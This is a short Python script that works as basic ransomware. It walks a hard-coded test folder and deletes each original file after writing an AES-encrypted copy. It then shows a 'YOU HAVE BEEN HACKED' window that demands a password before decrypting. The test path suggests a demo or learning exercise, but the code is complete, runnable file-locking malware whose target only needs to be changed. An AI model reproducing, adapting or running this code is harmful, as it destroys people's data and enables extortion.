import os
from tkinter import *
from tkinter import messagebox
import time
import pyaes

print("Working...")
time.sleep(2)
path = r"C:\Users\test\testing"

def encrypting():


    for root, dirs, files, in os.walk(path):
        for f in files:
            criptoPath = os.path.join(root, f)
            print(criptoPath)
            f = open(f'{criptoPath}', 'rb')
            file_data = f.read()
            f.close()
            os.remove(f'{criptoPath}')
            key = b"7c2e0cfd701d9001d2a1c3fe85cea847"
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)
            new_file = criptoPath + ".encrypted"
            new_file = open(f'{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def verify():
    key = ed1.get()
    if key == "SecretKey":
        decrypting("7c2e0cfd701d9001d2a1c3fe85cea847")
        for root, dirs, files, in os.walk(path):
            for f in files:
                criptoPath = os.path.join(root, f)
                file_splited = criptoPath.split('.')
                try:
                    if file_splited[2] == 'encrypted':
                        os.remove(f'{criptoPath}')
                except:
                    pass
        messagebox.showinfo("CORRECT!", "EVERYTHING IS OKAY")
        roots.destroy()
    else:
        messagebox.showwarning("WRONG ANSWER!", "INCORRECT")

def decrypting(decrypt_file):

    for root, dirs, files, in os.walk(path):
        for f in files:
            criptoPath = os.path.join(root, f)
            keybytes = decrypt_file.encode()
            name_file = open(criptoPath, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)
            format_file = criptoPath.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]
            dnew_file = open(f'{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()

if __name__ == '__main__':

    encrypting()
    if encrypting:
        roots = Tk()
        roots.title("YOU HAVE BEEN HACKED")
        roots.geometry("500x500")
        lb2 = Label(roots, text="YOUR DATA IS ENCRYPTED!!! GOOD LUCK GUESSING THE KEY")

        global ed1
        ed1 = Entry(roots,bd=5)
        bt1 = Button(roots, text='Confirm', command=verify)

        lb2.grid(row=1, column=4)
        ed1.grid(row=3, column=4)
        bt1.grid(row=5, column=4)
        roots.mainloop()
